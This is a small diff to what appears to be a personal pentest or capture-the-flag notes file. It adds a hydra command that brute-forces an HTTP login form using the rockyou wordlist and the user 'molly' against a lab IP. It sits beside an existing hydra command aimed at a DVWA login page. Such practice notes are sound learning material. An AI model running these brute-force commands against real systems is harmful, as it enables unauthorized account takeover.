@@ -10,6 +10,8 @@
 
 ```hydra -l admin -P /usr/share/dirb/wordlists/small.txt 192.168.1.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V```
 
+```hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.106.145 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V```
+
 -----
 
 
